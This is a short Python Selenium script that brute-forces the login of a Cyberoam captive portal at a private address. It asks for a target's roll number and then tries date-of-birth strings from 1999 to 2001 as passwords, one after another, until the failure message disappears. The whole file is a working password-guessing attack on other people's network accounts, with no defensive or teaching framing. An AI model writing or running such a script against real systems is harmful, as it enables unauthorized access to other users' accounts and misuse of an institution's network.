li=[]
for i in {"99","00","01"}:
    for j in {"01","02","03","04","05","06","07","08","09","10","11","12"}:
        for k in range(1,32):
            li.append(str(k)+j+i)
i=0

from selenium import webdriver
driver = webdriver.Edge()
driver.get("https://172.16.1.1:8090/")
s=input("enter roll no. to get cyberroam access on: in btech1010018 format")
while i<len(li):
    pwd = None
    usr = None
    while pwd is None or usr is None:
        usr = driver.find_element_by_name('frmHTTPClientLogin').find_element_by_class_name('maindiv').find_element_by_class_name('datablock').find_element_by_class_name('tablecss').find_element_by_id('usernametxt').find_element_by_name('username')
        pwd = driver.find_element_by_name('frmHTTPClientLogin').find_element_by_class_name('maindiv').find_element_by_class_name('datablock').find_element_by_class_name('tablecss').find_element_by_name('password')
    usr.send_keys(s)
    pwd.send_keys(li[i])
    i+=1
    if "The system could not log you on" not in driver.page_source:
        break
driver.close()
